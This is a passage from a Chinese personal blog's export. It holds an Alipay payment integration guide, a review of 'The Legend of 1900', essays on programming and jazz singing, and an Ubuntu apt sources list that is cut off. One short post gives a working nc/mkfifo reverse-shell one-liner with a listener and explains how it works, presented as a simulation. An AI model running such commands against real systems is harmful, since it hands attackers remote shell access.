<p>如果是个人开发者，不能直接在支付宝开放平台开通支付能力，可使用第三方平台接入，如<a href="https://www.pingxx.com/">ping++</a></p>
<h2 id="二、创建支付应用、开发配置"><a href="#二、创建支付应用、开发配置" class="headerlink" title="二、创建支付应用、开发配置"></a>二、创建支付应用、开发配置</h2><ol>
<li><p><strong>创建应用</strong> </p>
</li>
<li><p><strong>设置基础环境</strong> 获取支付宝网关、设置应用网关(己方)、设置授权回调地址</p>
<blockquote>
<p>注意</p>
<p>蚂蚁金服开放平台将对您填写的授权回调地址进行安全扫描，扫描结果请在1个小时后，前往“开发者中心-安全中心”查看。另外，请如实、准确填写授权回调网址，否则所有责任（包括但不限于赔偿损失）概由您负责。</p>
</blockquote>
</li>
<li><p><strong>设置接口加签方式</strong> RSA2(SHA256)密钥(推荐)</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1506222807933.png?imageMogr2/thumbnail/800"></p>
<blockquote>
<p><a href="http://p.tb.cn/rmsportal_6680_secret_key_tools_RSA_macosx.zip">MAC_OSX_RSA密钥生成工具</a> </p>
<p><a href="https://docs.open.alipay.com/291/105971">密钥生成工具使用方式</a></p>
</blockquote>
</li>
<li><p><strong>开发测试</strong></p>
</li>
</ol>
<h2 id="三、上线前签约"><a href="#三、上线前签约" class="headerlink" title="三、上线前签约"></a>三、上线前签约</h2><p>上线前签约<a href="https://docs.open.alipay.com/204">APP支付</a>能力，即可在线上调用开发好的APP支付功能</p>
<ol>
<li><strong>资料审核</strong> 填写企业信息、经营信息、银行账户等信息，上传相关证件。资料提交后，审核将在3个工作日内完成。</li>
<li><strong>验证账户</strong> 核实您提交的银行账户信息，以验证账户。</li>
<li><strong>签署产品协议</strong> 在线签署产品协议，完成签约。</li>
</ol>
<h1 id="支付开发流程"><a href="#支付开发流程" class="headerlink" title="支付开发流程"></a>支付开发流程</h1><p><img src="http://img01.taobaocdn.com/top/i1/LB1gqXQOVXXXXbdXXXXXXXXXXXX"></p>
<h1 id="服务端接口"><a href="#服务端接口" class="headerlink" title="服务端接口"></a>服务端接口</h1><h2 id="一、签名下单接口"><a href="#一、签名下单接口" class="headerlink" title="一、签名下单接口"></a>一、签名下单接口</h2><h2 id="二、支付成功的验签接口"><a href="#二、支付成功的验签接口" class="headerlink" title="二、支付成功的验签接口"></a>二、支付成功的验签接口</h2><h2 id="三、接收异步支付结果通知的接口"><a href="#三、接收异步支付结果通知的接口" class="headerlink" title="三、接收异步支付结果通知的接口"></a>三、接收异步支付结果通知的接口</h2><h2 id="四、查询支付结果的接口"><a href="#四、查询支付结果的接口" class="headerlink" title="四、查询支付结果的接口"></a>四、查询支付结果的接口</h2><h1 id="服务端支付DEMO"><a href="#服务端支付DEMO" class="headerlink" title="服务端支付DEMO"></a>服务端支付DEMO</h1><p><a href="https://openhome.alipay.com/doc/sdkDownload.resource?sdkType=JAVA">SDK1.5</a> 适用于Java语言、jdk版本1.5及以上的开发环境</p>
<p>代码示例仅供参考和测试，实际请根据业务来处理。异步通知处理过程中请对信息做确认，例如：订单号是否在商户您的系统中存在，订单金额是否匹配</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>APP</tag>
        <tag>业务</tag>
        <tag>支付宝</tag>
      </tags>
  </entry>
  <entry>
    <title>海上钢琴师</title>
    <url>/film/2020/01/%E6%B5%B7%E4%B8%8A%E9%92%A2%E7%90%B4%E5%B8%88/</url>
    <content><![CDATA[<p><img src="http://img.willowspace.cn/willowspace_2016/1579794763916.png?imageMogr2/thumbnail/800" alt="img"></p>
<p>2019 年 11 月 15 日《海上钢琴师》 重映 4K 修复版，在重映的第二天我去电影院观看了这部电影，实际上这次是二刷。现在它在豆瓣上有 9.3 分，是绝对高分的好电影。但它在 1998 年首映后的很长一段时间内是伴随着两极评价的，很多人把它看作是二十世纪最好看的电影之一，但同时也有一部分人认为这是一部“烂片”，一部最好看的“烂片”。之所以如此，是因为它讲述了一个极具浪漫主义，或者说神秘色彩的故事，故事的主人公选取了一个浪漫主义的名字叫 1900， 他是一个不食人间烟火的，整个人生都与世隔绝的人。他的形象过于神秘，人生传奇到令人难以置信，人们很难走进他的内心世界，因此也无法对他的人生态度和追求感同身受。但也正是因为在世俗世界里的人们难以接受 1900 的人生观和价值观。才形成了当时观众对于《海上钢琴师》这部电影爱者爱之深，厌者厌之切的局面。就我个人而言，首刷是在大概六七年前的大学期间，当时我觉得这部电影乏味冗长，1900 的故事或人生实在是无法让我提起兴趣，对于只想找一部剧情跌宕起伏，下饭的电影的我来说，这绝对不能算是一部“好看的”电影。但现如今二刷，我毕业三年了，早已离开了学校进入职场，开启了人生的激流阶段，面临过了许多没有标准答案的选择，这个时候再度观看《海上钢琴师》，我开始理解 1900 的人生观和价值观，我这才发现这绝对是一部好看的、耐看的、极度丰富的电影，<strong>它既可以是关于 1900 这样一个传奇人物的绝对个人的，关于个人选择的，又可以是关于 20 世纪的历史和社会的；****它既可以是高度超越性的、永恒哲学的，又可以仅仅是形而下的一段精彩的故事。</strong></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579794847732.png?imageMogr2/thumbnail/800" alt="img"></p>
<p><strong>电影非常成功地借助一个讲故事的人来把故事限定在广义的电影的旁支叙事之上</strong>，也就是说，1900 的故事，仅仅是那些发生在号手马克斯眼前的部分才是真切的，于是我们真切地借助马克斯的眼睛看到了 1900 生命当中的那些极度浪漫、极度传奇的段落。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579794865497.png?imageMogr2/thumbnail/800" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579794879895.png?imageMogr2/thumbnail/800" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579794895994.png?imageMogr2/thumbnail/800" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579794908367.png?imageMogr2/thumbnail/800" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579794971792.png?imageMogr2/thumbnail/800" alt="img"></p>
<p>比如说他们的相遇之夜，大风暴下之下打开轮锁的钢琴之舞，我们看到钢琴最终打破了那片美丽的彩镶玻璃墙壁，然后它在楼道中滑行，最终极端戏剧性地冲破了船长卧室的门，而滑稽的船长睡觉竟然穿着一件救生衣。</p>
<p>再比如说影片当中极端戏剧性的钢琴决斗，当时的爵士大师杰利听闻 1900 能将十几种 jazz 风格的音乐融合在一起，因此来与 1900 斗琴。而 1900 只是在借由音乐展现他在人们的脸上和行为中体会到的东西，这不失为一种形而上和形而下的对比。由此形成了一个非常华彩的段落，因为旁白当中已经告诉我们，1900 演奏起来的时候，他的双手就像四手联弹，于是在那个段落当中我们不断地看到光影和影像的拖尾所造成的四手，不断地利用钢琴漆所形成的各种倒影形成了 1900 的双像，那么在这个时刻他魔术般地化身为双重身、三重身，他魔术般地化身为四手甚至更多手的联弹，来表现那个不可能的速度、节奏、准确，来完成一种只有在电影银幕上我们才可能遭遇到的钢琴演奏的炫技。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579794989532.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795069806.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795104518.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795129581.png" alt="img"></p>
<p>我们借助马克斯的眼睛，目击了那个叫做遭遇激情的时刻，很有意思的是，导演在影片当中设置的另外一个结构性的不断复沓出现的造型元素，就是船内与船外，而连接着船内与船外，又隔绝着船内与船外的是舷窗。我们一次一次地看到 1900 在窗内望向窗外的世界，包括最后他和叙事人马克斯的告别。在无尽的摩天大楼一般的游轮舷窗当中，我们的叙事人辨认出了 1900 所在的那个，而近景镜头构成了圆形的舷窗所突显的这样一种经典绘画的构图。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795143195.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795155987.png?imageMogr2/thumbnail/800" alt="img"></p>
<p>在影片当中，导演设置了一个现在进行时，即马克斯得知维吉尼亚号将要被毁掉，而后闯入这个已经被废弃了的战时的医护船，一次再一次地去寻找 1900，试图挽救他的生命，试图领他下船的这样一个寻找之旅。关于寻找，关于倒计时的老游轮的毁灭，构成了一个强烈的悬念效果，而且同时保持了影片的叙事张力和情感张力以及时间张力。这样的一个完整的顺时时间线串联起了一个由闪回镜头所完成的 1900 生命传奇故事的叙事线索。而在这样一个对照的叙事时间当中，一个时间蒙太奇当中，导演显然非常有意识地选择所有的现在时是处在一种灰暗的光照、一种单调的色彩基调当中，而所有的闪回段落也就是豪华游轮上的场景，导演有意识地采取了一种极端富丽的古典油画似的布光、设色、构图和视觉效果。所以记忆更加璀璨明亮，而现实极端灰暗和乏味，而这也是影片当中的一个非常重要的色彩基调。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795172656.png?imageMogr2/thumbnail/800" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795186991.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795211499.png" alt="img"></p>
<p><strong>电影最巧妙的地方在于他用浪漫主义的手法塑造了 1900 这个角色。</strong>电影故事发生在一艘巨型客轮弗吉尼亚号上，主人公 1900 他一生从未离开过弗吉尼亚号，踏足过陆地，他甚至都不存在于人类社会。在他还是个孩子时，一群警察曾试图上船将这个没有身份的人带走，但却始终找不到他，当 22 天之后这个脏兮兮的孩子再次出现的时候，他已经成为了一个钢琴王子，至于他在何处，他是如何学会了钢琴，**这是**一个浪漫主义的传奇故事所不屑于去讲述**的**。从他作为一个钢琴王子登场的那个时刻开始，就已经完全处在一个浪漫主义想象的层面上。而同时，旁支视点使我们回避了所有现实主义追问的可能，使我们不必去回答乏味的现实主义所必须回答的问题，比如说我们可以搁置年幼的 1900 如何在 22 天的漫长时间当中躲过了无所不在的搜索；在废墟、坟墓般的船体当中，1900如何还能那样的衣着整齐，或者说他以什么为生。这些都可以被搁置，因为这是被限定的视点当中的限定的视觉观察和见证。这是一个影片当中非常突出的也非常聪明的、非常巧妙的艺术选择。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795257780.png" alt="img"></p>
<p>与之对应的是，影片采取了一个一以贯之的视觉处理，或者说一种视觉语言的修辞，就是在呈现 1900 的浪漫传奇性故事和他那个不可思议的天才奇迹的时候，影片大量采用了<strong>超浅焦的镜头</strong>呈现方式。当焦点范围是如此之浅的时候，它呈现的视觉效果就是如果 1900 是清晰的，他周围的人甚至他身边的人就都是含糊不清的；如果焦点是呈现在身边人身上，那么 1900 就是在焦点之外，而呈现成一个虚幻的，不能清晰分辨的影子，这样的一个视觉风格形成的表达是 1900 从未真实的和我们共处在一个时空，或者说我们永远无法触摸和到达 1900 的世界，就连故事的叙事人、1900 的朋友——马克斯，也无法真正的理解和抵达 1900 的世界。主人公作为一个对于人类社会而言不存在的生命。它形成了一个关于内外，关于存在与非存在，关于天才的奇迹式的世界和我们凡俗的日常生活的表述。电影一边告诉你说这是一个好故事，另外一边它告诉你主人公是不可被证明的，从未被记录的那么一个好故事，可能虚构了一个主人公。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795276003.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795287913.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795304625.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795318472.png" alt="img"></p>
<h1 id="关于人生态度与人生选择"><a href="#关于人生态度与人生选择" class="headerlink" title="关于人生态度与人生选择"></a>关于人生态度与人生选择</h1><p><strong>《海上钢琴师》是一部关于人生态度与人生选择的电影。</strong>影片的配角，同时也是故事的讲述人马克斯不止一次问 1900：“为什么不下船？就一次，亲眼去看看外面的世界，凭你高超的高琴演奏技艺，人们一定会为你疯狂的”。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795348658.png" alt="img"></p>
<p>“为什么，为什么，为什么，陆地上的人把时间都浪费在问为什么上了，冬天忧虑夏天晚到，夏天担心冬天将至，所以他们总是不停的寻找一个遥不可及，四季如夏的地方，那不适合我” 1900 回答道。</p>
<p>他是如此的简单干净，如此的未经世俗污染，他的世界里只有钢琴和音乐。这与饱受世俗困扰的马克斯形成了鲜明对比。电影一开始，马克斯走进一家古董乐器店，作为一位热爱音乐的小号手，他依依不舍的卖掉了他的康恩牌小号，从他之后又要求老板让他再吹最后一次，从他脸上的窘迫，我们不难猜测他当时一定是迫不得已，左右为难，但他终究是卖掉了自己坚持和热爱了多年的小号&#x2F;音乐。而有趣的是，马克斯在整部电影中他的眼珠总是摇摆不定，左右晃动，似乎在暗示他就是那样一个为世间琐事抉择所左右，为世俗所困扰的人，这在豆瓣上也为诸多观众津津乐道，但事实证明，这是一个过度解读，马克斯的饰演者<a href="https://www.zhihu.com/question/22842319?sort=created">普路特·泰勒·文斯</a>患有<a href="https://baike.baidu.com/item/%E7%9C%BC%E7%90%83%E9%9C%87%E9%A2%A4/619921?fr=aladdin">眼球震颤 （pathologic nystaqumus）</a>这样一种病，眼珠的左右晃动并非演技，这在他出演的另一部精彩的电影《致命 ID》中也可以看到。但网友的第二个 “过度解读” 我却非常赞同。即 1900 其实只是马克斯臆想出来的一个人物，整个故事都是他自己虚构的，因为他不像 1900 一般坚定，却又十分渴望成为 1900 那样纯粹坚定的人。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795406507.png" alt="img"></p>
<p>那么这里就不得不回顾一下故事当中的那个重要的解谜段落，就是在最后时刻，叙事人马克斯用那张破碎的唱片终于引出了如废墟一般的、如坟墓一般的弗吉尼亚号上面的 1900，然后，是第一次在整个影片当中出现了中规中距的构图，完全对称的双人中景，以及两个人之间对称的对切镜头，这一次 1900 向他陈述了他生命的选择，关于 88 个键的钢琴作为有限，而人作为无限、音乐作为无限的组合，<strong>关于无限对于有限的把控和有限对于无限的那种无力</strong>。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795417947.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795433902.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795447053.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795458672.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795471459.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795488050.png" alt="img"></p>
<p>这个时候我们不得不提及那个戏剧性的段落 —— 关于爱情的奇遇。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795503793.png" alt="img"></p>
<p>遭遇爱情的场景完全是一个舷窗内外的，由一个舷窗所突显、舷窗所框定的优美的肖像画的效果，而舷窗的磨玻璃更强化了梦中情人，恋爱中的 1900 眼中的女神所具有的那种朦胧、完美以及强大的召唤和诱惑。又是借助马克斯的眼睛，向我们呈现了 1900 生命当中的这些戏剧性的时刻，这样的一个令人回肠荡气的浪漫主义段落。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795514885.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795525851.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795537195.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795563724.png" alt="img"></p>
<p>用叙事人的说法：“是姑娘，当然了，永远是因为姑娘。”。也就是在男人为主体的故事当中，一个美丽的姑娘，是永恒的主题和永恒的行为动力。为了这样的一个冲动，1900毕生中唯一一次决定下船，并且走上了通向陆地的旋梯的时候，大家一定会记得那个段落：首先是近景镜头，在这个近景镜头当中，前后景都是清晰的，1900 的脸上出现了张皇，出现了恐惧，出现了迷惘。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795575765.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795587928.png" alt="img"></p>
<p>而后一个全景镜头拍摄 1900 的背影，他的背影置身在中景处，而后景当中是一望无际的纽约市中心著名的景观，导演非常准确地在这个有纵深的深焦镜头当中，把纽约城市当中的每一扇窗口都呈现得如此细腻和清晰，于是我们很强烈地从视觉上体验到了现代城市作为人类集装箱的这样一个基本特征，我们也同样强烈地在视觉上理解了此后 1900 将用语言告知我们的，<strong>关于城市没有尽头，世界没有尽头，那是一个无限的世界，是有限的个人，有限的生命，有限的选择所不能把控和确认的。****它表达了人类社会是上帝的钢琴，是一个需要无限的力量才可能掌控的，而个人的生命是如此微末的这样一个主题。</strong></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795603813.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795614151.png" alt="img"></p>
<p>如果说船上是有限的孤独，那船外就是无限的孤独。我猜想，这部电影在今天以及今后的观众当中会越来越成功，因为我们在 1900 的故事当中可以无尽地投射，比如说关于宅男宅女的生存梦想，关于有限和无限，关于今天我们被命名为选择困难症的一种“心理疾患”，因为太丰富，因为太巨大，因为一切都是无限，以致我们对自己的渺小、自己的需求、自己的愿望如此难于把握。1900 的那个形而上的表述也许可以落实到我们形而下的生活经验当中，在无尽的选择当中，我如何才能决定某一个女人或者某一个男人，某一个家，某一种生活方式，某一个职业，某一条道路，我怎么才能知道它对我而言是正确的。换句话说，<strong>今天我们可以把我们无尽的选择安置在 1900 的宿命的限定以及 20 世纪的有限选择之上，我们可以重新在有限与无限，个人与社会，存在与虚无，选择与非选择当中去理解 1900 的传奇。</strong></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795639754.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795603813.png" alt="img"></p>
<h1 id="世纪回眸"><a href="#世纪回眸" class="headerlink" title="世纪回眸"></a>世纪回眸</h1><p><img src="http://img.willowspace.cn/willowspace_2016/1579795681753.png" alt="img"></p>
<p><strong>《海上钢琴师》是一个世纪回眸的故事。</strong>大家回过头去看，弗吉尼亚号第一幕进入我们眼睛的方式，就像是拉下了帷幕，拉下了 20 世纪的帷幕。于是我才想到去注意这部电影制作完成并且投放影院的时期是 1998 年，也就是 20 世纪的最后时刻。而这部电影，它给主人公选取了一个浪漫主义的姓叫 1900。事实上，在影片当中他那个超过 20 个字母的长长的不可能的名字 —— Danny Boodman T.D. Lemon Nineteen Hundred，也经常被人们缩写为 1900。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795693432.png" alt="img"></p>
<p>1900 的名字的依据是说，主人公在 20 世纪的第一天被发现，他是豪华客舱当中的一个弃婴，这天肯定不是他的生日，却也只能是他的生日，标明了这是一个世纪回眸的故事，这是一个在 20 世纪即将终了的时刻，回首 20 世纪，而后讲述 20 世纪的故事。</p>
<p>对我来说，它告诉了我很多关于20世纪终结和21世纪开启的故事。如果让我去做一种索引式的阅读，也许我的阅读接近于 1900 的选择，不是从那些我看见的东西开始，而是从那些我没有看见的东西开始，而影片所讲述的故事就凸显了它没有讲述的故事：关于两次世界大战，关于冷战，关于人类一分为二，关于生死关头的对决，关于无数的尸体、血污、肮脏叛卖，为信仰而战斗，为信仰而牺牲或者背叛信仰，太多太多的故事是这部影片当中我们不曾看到的，那是人类共同的 20 世纪，也是携带着 1900 这个名字的角色必须穿越的那个世纪。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795706695.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795716295.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795736604.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795747239.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795764496.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795777456.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795790903.png" alt="img"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1579795807269.png" alt="img"></p>
<p>在寻找 1900 的过程当中，叙事人发现了 1900 曾经居住的仓房，摄影机镜头似乎漫不经心地掠过那个布满了一面墙壁的肖像、照片、纪念品，我们会看到 1900 这个角色在这艘船上几乎遭遇了绝大多数 20 世纪的伟人，而每一个伟人标识着不同的时代，不同的变化，不同的思想，不同的潮流，以及这些思想潮流之间的你死我活的对决。所以说，20 世纪被承诺，20 世纪被回望，20 世纪被遮蔽，20 世纪被遗忘。这本身成为了一个故事之外的故事，成为了一个<strong>有限的电影世界之外无限的关于电影的关于社会的关于文化的问题</strong>。</p>
]]></content>
      <categories>
        <category>film</category>
      </categories>
      <tags>
        <tag>人生选择,影评</tag>
      </tags>
  </entry>
  <entry>
    <title>编程真的能改变人的思维方式吗?</title>
    <url>/%E7%94%9F%E6%B4%BB/2019/05/%E7%BC%96%E7%A8%8B%E7%9C%9F%E7%9A%84%E8%83%BD%E6%94%B9%E5%8F%98%E4%BA%BA%E7%9A%84%E6%80%9D%E7%BB%B4%E6%96%B9%E5%BC%8F%E5%90%97/</url>
    <content><![CDATA[<p>于我一个秃子而言。</p>
<p>编程能提升人的抽象思维能力。代码中常常需要各种抽象，结构上的、行为上的、同类问题的、同类业务的。以至于善于抽象的程序员遇到任何问题都更倾向于探寻事物本质，寻找根本解决方法，企图一劳永逸。这样看来，说程序员是哲学家范畴似乎也没啥毛病。</p>
<p>惯性的抽象思维让程序员的生活更加简单。程序员的衣柜里都是清一色的格子衫；他们总是选择周五的晚上看一部电影，然后在周六睡个懒觉，以便能支撑他们在周日的户外扫街（996 例外）。 这样的描述有些偏激，但反映出程序员有自己的一套生活模式，这得益于他们对自己生活的抽象—衣服&#x3D;&#x3D;&#x3D;格子。因此生活中遇到的同类问题，程序员往往会按同样的套路出牌，这大概也是为什么他们稍显“呆板”的原因，你找他们推荐电脑，他们总是告诉你 mac；你找他们去逛街，他们总是直奔格子专柜。这样对他们来说的确能简化生活。</p>
<p>抽象思维让程序员在社交上形格势禁。不同于技术问题或生活问题。社交中的问题要复杂得多，毕竟人就是一个最复杂的存在。光是想与人坦诚的沟通就非常难了，如果按照程序员的“套路”，用既定的话术或模式去试图从另一个人那里获取信息，他们往往会碰壁。杰克·韦尔奇在《赢》中揭示“当你探索坦诚的含义时，你实际上是在设法了解人类的本质。数百年来，无数的心理学家和社会学家都在研究，为什么人们所说的与他们真正所指的存在区别；而哲学家思考同样的问题已经有数千年的时间了。最终，你会认识到人们之所以不说出自己的想法，是因为这会给自己带来更多的便利。”所以你看，与计算机的信息交换和与人的信息交换是两种复杂度截然不同的命题，用算法的术语来看前者复杂度是O(1)，你给计算机一个输入它给你一个输出；而后者复杂度是O(2^n)，你给人一个输入，她不光不一定会给你一个输出甚至会引发新的爆炸问题 。所以人们常说程序员情商低，不好沟通是有一定道理的，他们可能太执着于用统一的方式解决人的问题了，人最应该具体问题具体对待了，过度抽象反而适得其反。基于这点，你所见到的“情商低”的程序员可能往往技术不错，事实上业界确实有许多技术大佬他们不善社交，譬如林纳斯 。其实人的问题也是可以抽象的，不过那是心理学家、社会学家和哲学家的命题。程序员不应该执着于此，还是区分好工作、生活和社交，做个有情趣的程序员最好。</p>
<p>总而言之，抽象思维只是编程带给我诸多裨益中的一项。每天令我心存狂喜不觉无聊的是我知道世界上存在着只有编程才能以其特殊的手段给予我的感受。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>编程哲学</tag>
        <tag>抽象思维</tag>
      </tags>
  </entry>
  <entry>
    <title>爵士唱法</title>
    <url>/music/2018/12/%E7%88%B5%E5%A3%AB%E5%94%B1%E6%B3%95/</url>
    <content><![CDATA[<p>#爵士唱法</p>
<p>爵士唱法诞生于19世纪末，从开始出现，便很快被国际乐坛所接受，爵士乐以复杂的即兴，丰富的节奏而闻名，其唱法也没有太明显的框架，只要声音自然，一切方法都可以为其所用。</p>
<p>爵士唱法分为标准爵士和流行爵士两种类型。标准爵士唱法讲究即兴，广泛运用__切分音__。并经常运用衬词来即兴演唱，由于这种唱法具有较高难度，而且即兴后歌曲旋律性也不强，所以很少被中国歌手所采用，但在欧美真正称得上是爵士大家的，大部分都是标准爵士唱法的歌手。</p>
<p>流行爵士唱法是指运用一些__切分节奏__，并且有一些设计好的旋律变化，但切分和即兴的成分都不是很多，不过经常能体现出__摇摆__的特征，这种唱法极具有爵士乐的高雅性，又具有一定的旋律性，因此流行爵士唱法比较受观众的欢迎。</p>
]]></content>
      <categories>
        <category>music</category>
      </categories>
      <tags>
        <tag>jazz</tag>
      </tags>
  </entry>
  <entry>
    <title>通过远程命令反弹shell</title>
    <url>/technology/2017/05/%E8%BF%87%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<h2 id="通过shell命令模拟反弹shell的攻击过程"><a href="#通过shell命令模拟反弹shell的攻击过程" class="headerlink" title="通过shell命令模拟反弹shell的攻击过程"></a>通过shell命令模拟反弹shell的攻击过程</h2><p>其中attcker_machine是攻击者的机器，也是最终shell反弹的目标机器。meat_machine是一台受攻击的肉鸡，是shell被反弹的机器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&#123;attacker_machine_ip&#125; 监听2333端口</span></span><br><span class="line">nc -l -p 2333 -v </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反弹shell至&#123;meat_machine_ip&#125; 2333端口</span></span><br><span class="line">rm /tmp/bd;mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc &#123;meat_machine_ip&#125; 2333 &gt;/tmp/bd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不从stderr传给stdout</span></span><br><span class="line">rm /tmp/bd;mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i &gt;&amp;1 | nc &#123;attacker_machine_ip&#125; 2333 &gt; /tmp/bd</span><br></pre></td></tr></table></figure>

<p>mkfifo 是创建一个先进先出的文件，整个流程如下：</p>
<ol>
<li>先在受害机器上创建了一个先进先出的文件bd</li>
<li>nc连接控制机，接受控制机的输入，传给bd这个文件</li>
<li>cat 将bd文件内容传给&#x2F;bin&#x2F;sh 执行</li>
<li><code>2&gt;&amp;1</code>是将stderr传给stdout，然后重定向给nc</li>
<li>nc通过网络将结果传给了控制机</li>
</ol>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>web安全</tag>
        <tag>shell</tag>
        <tag>远程命令执行</tag>
        <tag>nc</tag>
      </tags>
  </entry>
  <entry>
    <title>配置 Linux apt-get 源</title>
    <url>/technology/2019/04/%E9%85%8D%E7%BD%AE-Linux-apt-get-%E6%BA%90/</url>
    <content><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb cdrom:[Ubuntu 18.04.1 LTS _Bionic Beaver_ - Release amd64 (20180725)]/ bionic main restricted</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See http://help.ubuntu.com/community/UpgradeNotes <span class="keyword">for</span> how to upgrade to</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">newer versions of the distribution.</span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic main restricted</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic main restricted</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Major bug fix updates produced after the final release of the</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># distribution.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-updates main restricted</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-updates main restricted</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># team. Also, please note that software in universe WILL NOT receive any</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># review or updates from the Ubuntu security team.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic universe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic universe</span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-updates universe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-updates universe</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># team, and may not be under a free licence. Please satisfy yourself as to</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># your rights to use the software. Also, please note that software in</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># multiverse WILL NOT receive any review or updates from the Ubuntu</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># security team.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic multiverse</span></span><br><span 